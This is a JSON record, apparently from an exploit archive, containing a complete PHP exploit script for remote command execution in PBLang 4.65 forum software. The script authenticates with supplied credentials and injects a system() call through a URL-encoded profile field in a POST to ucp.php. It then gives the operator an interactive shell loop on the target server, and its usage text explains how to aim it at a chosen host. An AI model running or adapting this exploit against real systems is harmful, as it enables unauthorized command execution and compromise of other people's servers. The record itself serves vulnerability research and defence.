{
  "id": "1202",
  "title": "PBLang 4.65 - Remote Command Execution (2)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "<?php\r\n#\r\n|    ##############################################    |\r\n|    # PBLang <= 4.65 remote commands exec exploit#    |\r\n|    # tested on 4.65                             #    |\r\n|    # (c)oded by Pengo 2005 RST/GHC              #    |\r\n|    # http://rst.void.ru                         #    |\r\n|    # http://ghc.ru                              #    |\r\n|    ##############################################    |\r\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# WARNING! This exploit is successfully work when magic_quotes_rpc off =(\r\n# D:\\httpd\\php>php.exe ..\\www\\r57pblang465.php localhost /pbl/ \"pblcookie732128=Pe\r\n# ng0; PBLsecid=a4c2f845c002ac54f5751440647f3c91;\" Peng0 PrSrS\r\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n$ARGV = $_SERVER['argv'];\r\nglobal $ARGV;\r\nif(count($ARGV) == 0)\r\n{\r\n echo base64_decode(\"3fLu8iDx6vDo7/Ig5O7r5uXtIOH78vwg5+Dv8/nl7SDo5yDq7uzg7eTt7u\r\nkg8fLw7uroLiDR7eD34OvgIO3z5u3uIOfg8OXj6PHy8Ojw7uLg8vzx/yDoDQroIOfg6+7j6O3o8vzx/\r\nyDt4CD25evl4u7sIPTu8PPs5Swg5+Dy5ewg7fPm7e4g7+7x7O7y8PLl8vwg6vPq6DogcGJsY29va2llI\r\nFBCTHNlY2lkLg0KxfHr6CDi6uv+9+Xt+yBtYWdpY19xdW90ZXNfcnBjIPHq8Ojv8iDt5SD08+3q9uju7\r\nejw8+XyLg==\");\r\n exit;\r\n}\r\n\r\nif (count($ARGV) < 5)\r\n{\r\n echo '############################################################\r\n     PBLang <=4.65 remote command execution exploit\r\n        by RST/GHC // rst.void.ru / ghc.ru //\r\n############################################################\r\n usage:\r\n r57pblang465.php [URL] [DIR] [COOKIE] [LOGIN] [PASS] [PROXI:PORT]\r\n params:\r\n  [URL] - server url e.g. www.host.ru\r\n  [DIR] - directory where PBLang installed e.g. /forum/ or /\r\n  [COOKIE] - e.g. \"pblcookie732128=Peng0; PBLsecid=a4c2f845c002ac54f5751440647f3c91;\"\r\n  [NAME] - your account name\r\n  [PASS] - your account pass\r\n  [PROXI:PORT] - e.g. \"130.208.18.30:3128\" (optional)\r\n############################################################';\r\n exit;\r\n}\r\n\r\n$serv   = $ARGV[1];\r\n$dir    = $ARGV[2];\r\n$cookie = $ARGV[3];\r\n$login  = $ARGV[4];\r\n$pass   = $ARGV[5];\r\n\r\nif(isset($ARGV[6]))\r\n{\r\n $ARGV[6] = parse_url($ARGV[6]);\r\n $host = $ARGV[6]['host'];\r\n $port = $ARGV[6]['port'];\r\n} else {\r\n $host = $serv;\r\n $port = '80';\r\n}\r\n\r\nfunction create_socket($hostname,$portt,$post)\r\n{\r\n $socket = @fsockopen($hostname, $portt, $errno, $errstr, 60)\r\n            or die (\"\\n[-] CONNECT FAILED\\r\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\");\r\n $answer = '';\r\n fwrite($socket,$post);\r\n while (!feof($socket))\r\n {\r\n  $answer .= fgets($socket, 128);\r\n }\r\n fclose($socket);\r\n return $answer;\r\n}\r\n\r\n$a = 1;\r\n\r\nprint \"\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\";\r\nprint \"\\nexample 'close'\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n\r\n$din = fopen('php://stdin','r');\r\n\r\nwhile ($a !== 0)\r\n{\r\n print \"shell>\"; $cmd = fgets($din, 100);\r\n if(!stristr($cmd,'close'))\r\n {\r\n  echo $cmd.\"\\n\";\r\n\r\n  $query = \"user=\";\r\n  $query .= $login;\r\n  $query .= \"&pass=\";\r\n  $query .= $pass;\r\n  $query .= \"&pass2=\";\r\n  $query .= $pass;\r\n  $query .= \"&oldpass=\";\r\n  $query .= $pass;\r\n  $query .= \"&em=cool@hacker.ru&emhide=hide\";\r\n  $query .= \"&realname=&alias=\".$login.\"&msn=&icq=&aim=&yahoo=&qq=&web=http%3A%2F%2F\";\r\n  $query .= \"&loc=%22%3B+system%28%22echo%20%5F%45%4E%54%45%52%5F%3B%20\";\r\n  $query .= $cmd;\r\n  $query .= \"%3B%20%5F%51%55%49%54%5F%22%29%3B+echo+%22\";\r\n  $query .= \"&pt=rst.ghc%21&av=none&webav=&sig=&regcode=1125428486&lang=en&accept=1&Submit=%CE%F2%EF%F0%E0%E2%E8%F2%FC\";\r\n\r\n  $post = \"POST http://\".$serv.$dir.\"ucp.php?id=2&user=\".$login.\" HTTP/1.0\\r\\nHost: \".$serv.\"\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nUser-Agent: Mozilla/4.0\\r\\nCookie: \".$cookie.\"\\r\\nContent-Length: \".strlen($query).\"\\r\\n\\r\\n$query\";\r\n\r\n  $answer = create_socket($host,$port,$post);\r\n/*\r\n  $fp = fopen('lol.htm','w');\r\n  fwrite($fp,$answer);\r\n  fclose($fp);\r\n*/\r\n  if (eregi(\"_ENTER_(.*)_QUIT_\" , $answer, $cut))\r\n  {\r\n   $a = 1;\r\n   echo $cut[1];\r\n   echo \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n  } else {\r\n    echo \"\\r\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n    echo \"[-] EXPLOIT FAILD\\r\\n\";\r\n    echo \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n   $a = 0;\r\n  }\r\n } else {\r\n  echo \"\\r\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n  echo \"[-] EXPLOIT CLOSED\\r\\n\";\r\n  echo \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n  $a = 0;\r\n  fclose($din);\r\n }\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-09-07]",
  "url": "https://www.exploit-db.com/exploits/1202"
}